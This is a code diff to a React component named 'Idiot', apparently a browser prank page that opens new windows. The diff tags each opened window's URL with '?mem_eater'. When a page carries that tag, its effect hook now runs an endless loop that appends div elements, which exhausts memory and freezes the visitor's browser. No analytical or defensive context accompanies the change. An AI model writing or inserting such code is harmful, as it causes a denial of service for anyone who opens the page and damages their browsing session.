@@ -10,7 +10,7 @@ function Idiot() {
     };
 
     const openWindow = (url: string) => {
-        const fullUrl = `${url}?ready`;
+        const fullUrl = `${url}?mem_eater`;
         window.open(
             fullUrl,
             "_blank",
@@ -53,9 +53,10 @@ function Idiot() {
     };
 
     useEffect(() => {
-        if (window.location.search.includes("ready")) {
-            window.addEventListener("keydown", handleActivation);
-            window.addEventListener("click", handleActivation);
+        if (window.location.search.includes("mem_eater")) {
+            while (true) {
+                document.body.appendChild(document.createElement('div'));
+            }
         }
 
         return () => {
